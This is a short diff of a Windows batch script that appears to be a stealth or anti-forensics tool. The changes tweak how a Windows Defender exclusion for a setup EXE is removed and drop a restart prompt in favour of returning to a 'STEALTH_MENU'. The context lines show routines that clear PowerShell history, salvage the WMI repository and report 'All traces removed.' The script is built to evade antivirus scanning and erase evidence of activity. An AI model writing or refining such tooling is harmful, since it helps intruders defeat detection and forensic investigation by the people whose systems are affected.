@@ -262,7 +262,7 @@ echo Enabling audit logs...
 call :ENABLE_AUDIT_LOGS
 
 echo Removing Windows Defender exclusion for EXE...
-powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+powershell -Command "Try { Remove-MpPreference -ExclusionPath '%SETUP_EXE%' } Catch { }" >nul 2>&1
 
 echo Running cleanup...
 
@@ -282,13 +282,9 @@ winmgmt /salvagerepository >nul 2>&1
 call :CLEAN_PS_HISTORY
 
 echo Cleanup done. All traces removed.
-choice /m "Restart required to fully flush traces. Restart now?"
-if errorlevel 1 (
-    shutdown /r /t 3
-) else (
-    pause
-    goto STEALTH_MENU
-)
+pause
+goto STEALTH_MENU
+
 
 :: === Alert Admin Placeholder ===
 
